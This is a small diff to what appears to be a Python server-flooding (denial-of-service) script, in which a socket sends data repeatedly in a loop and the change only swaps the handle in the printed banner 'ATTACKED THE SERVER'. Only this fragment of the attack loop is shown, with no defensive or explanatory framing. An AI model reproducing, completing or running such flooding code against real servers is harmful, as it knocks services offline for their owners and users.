@@ -38,7 +38,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Xs XinZu ATTACKED THE SERVER ")
+			print(i +" DerZ ATTACKED THE SERVER ")
 		except:
 			s.close()
 			print("[*] ERROR SERVER TIME OUT")
